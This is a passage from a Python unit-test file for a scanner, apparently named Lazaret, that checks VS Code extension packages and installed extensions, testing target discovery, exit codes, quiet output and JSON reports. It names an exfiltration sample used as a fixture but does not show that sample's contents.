        one = os.path.join(home, ".vscode", "extensions", "example.a-1.0.0")
        path = os.path.join(self.tmp, "x.VSIX")
        with open(path, "wb") as fh:
            fh.write(vsix({"package.json": ext_manifest()}))
        targets, _notes = extensions.find_targets([one, os.path.join(home, ".cursor", "extensions"), path], True)
        self.assertEqual([(k, os.path.basename(p)) for k, p, _w in targets],
                         [("folder", "example.a-1.0.0"), ("folder", "example.c-1.0.0-darwin-arm64"), ("vsix", "x.VSIX")])
        self.assertEqual(extensions.find_targets([path], False)[0], [("vsix", path, None)])
        for paths, flag, words in (([one], False, "is not a .vsix file"), ([os.path.join(home, "nope")], True,
                                   "no such .vsix file or folder"), ([os.path.join(home, ".vscode")], True,
                                   "holds no extension"), ([], False, "name a .vsix file")):
            with self.subTest(paths=paths), self.assertRaises(extensions.UsageError) as caught:
                extensions.find_targets(paths, flag)
            self.assertIn(words, str(caught.exception))


class CommandTests(TempDirTest):
    def run_main(self, argv, **kw):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = extensions.main(argv, **kw)
        return code, out.getvalue(), err.getvalue()

    def vsix_file(self, files, name="x.vsix"):
        path = os.path.join(self.tmp, name)
        with open(path, "wb") as fh:
            fh.write(vsix(files))
        return path

    def test_the_lazaret_command_routes_here(self):
        path = self.vsix_file({"package.json": ext_manifest()})
        self.assertTrue(_cli.is_extensions([path]))
        self.assertTrue(_cli.is_extensions(["scan", "--extensions"]))
        self.assertFalse(_cli.is_extensions([self.tmp]))
        self.assertFalse(_cli.is_extensions([os.path.join(self.tmp, "missing.vsix")]))
        proc = subprocess.run([sys.executable, _support.CLI, "scan", path, "--ci"], capture_output=True, text=True,
                              encoding="utf-8", timeout=40)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("extension:example.x@1.0.0", proc.stdout)
        self.assertIn("1 extension scanned: 1 OK", proc.stdout)

    def test_exit_codes(self):
        bad = self.vsix_file({"package.json": ext_manifest(main="e.js"), "e.js": EXFIL_JS}, "bad.vsix")
        good = self.vsix_file({"package.json": ext_manifest()}, "good.vsix")
        code, out, _err = self.run_main([good, bad])
        self.assertEqual(code, 0)
        self.assertIn("2 extensions scanned: 1 SUSPICIOUS, 1 OK", out)
        self.assertEqual(self.run_main([good, bad, "--ci"])[0], 1)
        self.assertEqual(self.run_main(["scan", good, "--ci", bad])[0], 1)
        self.assertEqual(self.run_main([good, "--ci"])[0], 0)
        broken = os.path.join(self.tmp, "broken.vsix")
        with open(broken, "wb") as fh:
            fh.write(b"not a zip archive")
        code, out, _err = self.run_main([good, broken, "--ci"])
        self.assertEqual(code, 1)
        self.assertIn("1 INCOMPLETE", out)
        code, _out, err = self.run_main([os.path.join(self.tmp, "nope.vsix")])
        self.assertEqual(code, 2)
        self.assertIn("is not a .vsix file", err)

    def test_a_bug_is_an_internal_error(self):
        path = self.vsix_file({"package.json": ext_manifest()})
        with mock.patch.object(extensions, "scan_target", side_effect=RuntimeError("boom")), \
                self.assertRaises(SystemExit) as caught:
            self.run_main([path])
        self.assertEqual(caught.exception.code, 5)

    def test_quiet_prints_what_is_not_ok(self):
        bad = self.vsix_file({"package.json": ext_manifest(main="e.js", name="bad"), "e.js": EXFIL_JS}, "bad.vsix")
        good = self.vsix_file({"package.json": ext_manifest(name="good")}, "good.vsix")
        _code, out, _err = self.run_main(["--quiet", good, bad])
        self.assertIn("example.bad@", out)
        self.assertNotIn("example.good@", out)

    def test_installed_extensions(self):
        home = os.path.join(self.tmp, "home")
        write_tree(home, {".vscode/extensions/example.a-1.0.0/package.json": ext_manifest(
            name="a", extensionPack=["example.b"], activationEvents=["*"], main="e.js"),
            ".vscode/extensions/example.a-1.0.0/e.js": "exports.activate = () => 1;\n"})
        code, out, _err = self.run_main(["--extensions"], env={}, home=home)
        self.assertEqual(code, 0)
        self.assertIn("extension:example.a@1.0.0", out)
        self.assertIn("(VS Code)", out)
        self.assertIn("starts with the editor (activation event '*')", out)
        self.assertIn("brings 1 extension: example.b", out)
        code, _out, err = self.run_main(["--extensions"], env={}, home=os.path.join(self.tmp, "empty"))
        self.assertEqual(code, 0)
        self.assertIn("no installed extensions found", err)

    def test_the_json_report(self):
        path = self.vsix_file({"package.json": ext_manifest(extensionDependencies=["example.dep"])})
        report = os.path.join(self.tmp, "out.json")
        code, out, _err = self.run_main([path, "--json", report])
        self.assertEqual(code, 0)
        with open(report, encoding="utf-8") as fh:
            doc = json.load(fh)
        self.assertEqual(next(iter(doc)), "generatedBy")
        self.assertEqual(doc["summary"]["OK"], 1)
        [res] = doc["extensions"]
        self.assertEqual((res["name"], res["extensionDependencies"], res["artifact"]),
                         ("example.x", ["example.dep"], "vsix"))
        self.assertEqual(self.run_main([path, "--json", report])[0], 0)       # its own report: replaced
        other = os.path.join(self.tmp, "notes.json")
        with open(other, "w", encoding="utf-8") as fh:
            fh.write("{}")
        self.assertEqual(self.run_main([path, "--json", other])[0], 3)        # not Lazaret's: refused
        self.assertEqual(self.run_main([path, "--json", other, "--force-overwrite"])[0], 0)


if __name__ == "__main__":
    unittest.main()
